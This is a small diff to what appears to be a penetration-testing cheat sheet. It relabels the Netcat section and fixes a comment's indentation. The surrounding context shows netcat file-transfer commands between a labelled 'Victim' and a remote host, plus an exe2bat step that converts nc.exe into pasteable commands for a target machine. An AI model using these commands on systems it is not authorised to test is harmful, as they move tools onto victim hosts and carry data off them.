@@ -78,7 +78,7 @@ msbuild [src.sln]
 scp user@hostname:/path/to/src user@hostname:/path/to/dst
 ```
 
-- Netcat
+- Netcat (/Ncat)
 ```
 nc -nvlp $RPORT > out.file # Victim
 
@@ -87,7 +87,7 @@ nc -nv $RHOST $RPORT < in.file
 
 - exe2bat
 ```
- # Convert a windows executable to a copy and paste set of commands
+# Convert a windows executable to a copy and paste set of commands
 wine $(locate exe2bat.exe) nc.exe nc.txt
 ```
 
